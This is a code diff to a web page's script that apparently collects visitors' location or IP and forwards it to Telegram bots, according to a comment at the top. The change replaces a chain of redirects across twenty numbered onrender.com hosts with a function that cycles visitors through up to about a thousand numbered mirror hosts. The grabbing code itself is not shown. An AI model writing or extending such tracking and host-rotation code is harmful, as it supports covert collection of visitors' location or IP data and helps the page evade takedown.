@@ -17,70 +17,7 @@
           // Location permission denied, send IP result to Telegram bots
         
 //////1//////
-if (window.location.href === 'https://mhf1.onrender.com/') {
-  window.location.href = 'https://mhf2.onrender.com/';
-}
-else if (window.location.href === 'https://mhf2.onrender.com/') {
-  window.location.href = 'https://mhf3.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf3.onrender.com/') {
-  window.location.href = 'https://mhf4.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf4.onrender.com/') {
-  window.location.href = 'https://mhf5.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf5.onrender.com/') {
-  window.location.href = 'https://mhf6.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf6.onrender.com/') {
-  window.location.href = 'https://mhf7.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf7.onrender.com/') {
-  window.location.href = 'https://mhf8.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf8.onrender.com/') {
-  window.location.href = 'https://mhf9.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf9.onrender.com/') {
-  window.location.href = 'https://mhf10.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf10.onrender.com/') {
-  window.location.href = 'https://mhf11.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf11.onrender.com/') {
-  window.location.href = 'https://mhf12.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf12.onrender.com/') {
-  window.location.href = 'https://mhf13.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf13.onrender.com/') {
-  window.location.href = 'https://mhf14.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf14.onrender.com/') {
-  window.location.href = 'https://mhf15.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf15.onrender.com/') {
-  window.location.href = 'https://mhf16.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf16.onrender.com/') {
-  window.location.href = 'https://mhf17.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf17.onrender.com/') {
-  window.location.href = 'https://mhf18.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf18.onrender.com/') {
-  window.location.href = 'https://mhf19.onrender.com/';
-} 
-else if (window.location.href === 'https://mhf19.onrender.com/') {
-  window.location.href = 'https://mhf20.onrender.com/';
-} 
-else
-{
-window.location.href = 'https://mhf1.onrender.com/';
-}
-
-
-
+redirectToNextURL();
 //////1//////
         }
       }
@@ -157,6 +94,38 @@ window.location.href = 'https://mhf1.onrender.com/';
       }),
     });
   }
+
+
+
+
+function redirectToNextURL() {
+  // Get the current URL
+  var currURL = window.location.href;
+
+  // Extract the current number from the URL
+  var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
+
+  // Check if the current number is less than or equal to 999
+  if (currNum <= 999) {
+    // Increment the current number by 1 and construct the next URL
+    var nextNum = currNum + 1;
+    var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);
+
+    // Redirect to the next URL
+    window.location.href = nextURL;
+  } else {
+    // If the current number is greater than 999, display an alert message
+  //  alert('You have reached the maximum number of URLs.');
+window.location.href = 'https://mhf1.onrender.com/';
+  }
+}
+
+
+
+
+
+
+
 </script>
 
 <main>
